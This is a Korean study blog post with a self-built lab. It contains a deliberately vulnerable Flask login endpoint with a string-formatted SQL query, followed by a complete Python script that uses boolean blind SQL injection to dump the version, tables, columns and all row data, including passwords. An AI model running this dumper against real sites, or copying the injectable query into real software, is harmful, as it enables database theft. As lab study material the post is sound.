---
layout: single
title: "Blind SQLi 공부 (260425)"
date: 2026-04-25 15:55 +0900
categories: 
    - WEB-study
tag: 
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Blind SQL Injection] Study (260425)

<br>

아래 코드를 통해서 Blind SQLi를 테스트해보자.

```python
from flask import Flask, request
import sqlite3
import os

app = Flask(__name__)
DB = "lab.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("DROP TABLE IF EXISTS users")
    c.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT
        )
    """)
    c.executemany("INSERT INTO users VALUES (?, ?, ?)", [
        (1, "admin", "supersecret123"),
        (2, "guest", "guest1234"),
        (3, "flag",  "FLAG{blind_sqli_success}"),
    ])
    conn.commit()
    conn.close()

@app.route("/")
def index():
    return """
<h2>Blind SQLi Lab</h2>
<form method="GET" action="/login">
    username: <input name="username"><br><br>
    <input type="submit" value="Check">
</form>
<hr>
<p>Endpoints:</p>
<ul>
  <li>GET /login?username=admin</li>
  <li>GET /reset (DB 초기화)</li>
</ul>
"""

@app.route("/login")
def login():
    username = request.args.get("username", "")

    # 취약한 쿼리 (Blind SQLi 포인트)
    query = f"SELECT * FROM users WHERE username = '{username}'"

    try:
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute(query)
        result = c.fetchone()
        conn.close()
    except Exception as e:
        return f"<b>Error:</b> {e}", 500

    if result:
        return "<h3>exists</h3>", 200
    else:
        return "<h3>not exists</h3>", 200

@app.route("/reset")
def reset():
    init_db()
    return "DB reset OK"

if __name__ == "__main__":
    init_db()
    print("[*] http://127.0.0.1:5000")
    print("[*] users: admin / guest / flag")
    app.run(debug=False, port=5000)

```



<br>

```python
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = "http://127.0.0.1:5000/login"

def blind_request(query):
    payload = {"username": query}
    r = requests.get(url=url, params=payload, verify=False, proxies=proxies)
    return "not" not in r.text

# 문자열 길이 추출 (length() 함수 사용)
def extract_length(query):
    low, high = 0, 500
    while low <= high:
        mid = (low + high) // 2
        if blind_request(f"' OR length({query}) > {mid}-- -"):
            low = mid + 1
        else:
            high = mid - 1
    return low

# 숫자 값 추출 (count(*) 등 정수값 직접 비교)
def extract_count(query):
    low, high = 0, 500
    while low <= high:
        mid = (low + high) // 2
        if blind_request(f"' OR ({query}) > {mid}-- -"):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract_string(query):
    length = extract_length(query)
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if blind_request(f"' OR unicode(substr({query},{i},1)) > {mid}-- -"):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] {result}")
    return result

def extract_tables():
    count = extract_count("select count(*) from sqlite_master where type='table'")
    print(f"[*] table count: {count}")
    tables = []
    for i in range(count):
        name = extract_string(f"(select name from sqlite_master where type='table' limit {i}, 1)")
        print(f"[*] table[{i}]: {name}")
        tables.append(name)
    return tables

def extract_columns(table_name):
    ddl = extract_string(f"(select sql from sqlite_master where type='table' and name='{table_name}')")
    print(f"[*] DDL: {ddl}")
    match = re.search(r'\((.+)\)', ddl, re.DOTALL)
    if not match:
        return []
    columns = []
    for col in match.group(1).split(','):
        col_name = col.strip().split()[0]
        columns.append(col_name)
        print(f"[*] column: {col_name}")
    return columns

def extract_data(table_name, column_name):
    count = extract_count(f"select count(*) from {table_name}")
    print(f"[*] row count in '{table_name}': {count}")
    results = []
    for i in range(count):
        val = extract_string(f"(select {column_name} from {table_name} limit {i}, 1)")
        print(f"[*] {table_name}.{column_name}[{i}]: {val}")
        results.append(val)
    return results

def dump_all():
    print("=" * 50)
    version = extract_string("sqlite_version()")
    print(f"[*] version: {version}")
    print("=" * 50)

    tables = extract_tables()

    all_data = {}
    for table in tables:
        print(f"\n[*] === table: {table} ===")
        columns = extract_columns(table)
        if not columns:
            print(f"[!] no columns found for {table}")
            continue

        all_data[table] = {col: [] for col in columns}
        for col in columns:
            print(f"\n[*] extracting {table}.{col}")
            all_data[table][col] = extract_data(table, col)

    return all_data

if __name__ == "__main__":
    result = dump_all()

    print("\n" + "=" * 50)
    print("[*] DUMP RESULT")
    print("=" * 50)
    for table, cols in result.items():
        print(f"\n[+] table: {table}")
        for col, values in cols.items():
            print(f"  [{col}]: {values}")
```

